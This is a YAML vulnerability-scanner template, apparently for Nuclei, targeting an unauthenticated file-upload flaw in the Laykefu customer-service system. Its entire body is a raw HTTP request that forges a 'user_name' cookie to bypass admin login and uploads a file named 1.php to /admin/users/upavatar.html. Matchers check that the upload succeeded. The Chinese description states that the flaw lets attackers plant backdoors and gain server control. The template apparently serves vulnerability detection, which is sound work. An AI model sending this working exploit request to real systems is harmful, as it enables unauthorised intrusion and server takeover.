id: laykefu-upavatar-upload

info:
  name: Laykefu upavatar - File Upload
  author: qwtd
  severity: critical
  description: |
    Laykefu客服系统/admin/users/upavatar.html接口处存在文件上传漏洞，而且当请求中Cookie中的”user_name“不为空时即可绕过登录系统后台，未经身份验证的攻击者可利用此问题，上传后门文件，获取服务器权限。
  reference:
    - https://github.com/wy876/POC/blob/main/Laykefu%E5%AE%A2%E6%9C%8D%E7%B3%BB%E7%BB%9F/Laykefu%E5%AE%A2%E6%9C%8D%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  tags: laykefu

http:
  - raw:
      - |
        POST /admin/users/upavatar.html HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 194
        Accept: application/json, text/javascript, */*; q=0.01
        X-Requested-With: XMLHttpRequest
        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.26
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3OCVBiwBVsNuB2kR
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: user_name=1; user_id=3
        sec-ch-ua-platform: "Windows"
        sec-ch-ua: "Edge";v="107", "Chromium";v="107", "Not=A?Brand";v="24"
        sec-ch-ua-mobile: ?0
        Connection: close

        ------WebKitFormBoundary3OCVBiwBVsNuB2kR
        Content-Disposition: form-data; name="file"; filename="1.php"
        Content-Type: image/png

        {{randstr}}
        ------WebKitFormBoundary3OCVBiwBVsNuB2kR--

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "code\":0"
          - "msg\":\"ok"
          - '{"src":"\/uploads"'
        condition: and

      - type: status
        status:
          - 200
